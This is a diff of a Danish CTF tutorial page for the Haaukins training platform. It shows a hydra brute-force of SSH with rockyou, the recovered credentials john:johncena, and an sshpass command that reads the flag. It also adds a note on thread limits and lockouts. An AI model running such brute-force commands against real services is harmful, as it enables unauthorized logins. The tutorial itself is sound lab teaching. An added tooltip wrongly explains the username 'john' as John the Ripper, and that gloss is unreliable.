@@ -23,7 +23,7 @@
 <div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
 <div class="callout">📚 <strong>Baggrund:</strong> denne opgave bygger på en fælles teknik — læs primeren: <a href="kom-i-gang.html">Kom i gang: VPN, Hosts og lab-opsætning</a>.</div>
 <h2>Trin for trin</h2>
-<pre><code>hydra -l john -P rockyou.txt -t 4 -f ssh://&lt;ip&gt;      # -> john:johncena (tidligt i rockyou)
+<pre><code><span class="gloss" tabindex="0" data-tip="Online brute-force-værktøj mod login-protokoller (SSH, FTP, HTTP, ...).">hydra</span> -l <span class="gloss" tabindex="0" data-tip="John the Ripper — password-cracker (CPU-baseret, mange hash-formater).">john</span> -P rockyou.txt -t 4 -f ssh://&lt;ip&gt;      # -> john:johncena (tidligt i rockyou)
 sshpass -p johncena ssh -o PreferredAuthentications=password john@&lt;ip&gt; 'cat ~/flag.txt'</code></pre>
              <p><code>-t 4</code> for SSH (OpenSSH afviser for mange parallelle). Credentials er statiske; flaget
              er per-instans.</p>
@@ -32,6 +32,13 @@ sshpass -p johncena ssh -o PreferredAuthentications=password john@&lt;ip&gt; 'ca
 </details>
 <h2>Hvad du har lært</h2>
 <ul><li>Hintet navngiver ordlisten ('rocking' = rockyou).</li><li>SSH-brute: <code>hydra -t 4</code>; svage passwords ligger tidligt i rockyou.</li></ul>
+<h2>Hvor ses dette igen?</h2>
+<p>En lille detalje der sparer tid: SSH-brute skal køre med få parallelle forsøg
+(<code>-t 4</code>), fordi OpenSSH struber eller afviser mange samtidige forbindelser, så flere
+tråde gør det faktisk LANGSOMMERE eller får dig låst ude. Og svage passwords ligger tidligt i
+rockyou (listen er sorteret efter hyppighed), så et hit kommer ofte i de første tusinde. Mod en
+rigtig tjeneste er den slags online-brute desuden støjende og udløser lockouts, offline-cracking
+af et hash er næsten altid at foretrække når det er muligt.</p>
 <footer>
 Del af <a href="index.html">Haaukins CTF-tutorials</a>. <a href="https://www.haaukins.dk/" target="_blank">Haaukins</a>
 er en dansk undervisningsplatform til sikkerhedstræning (AAU / De Danske Cybermesterskaber) — alle opgaver
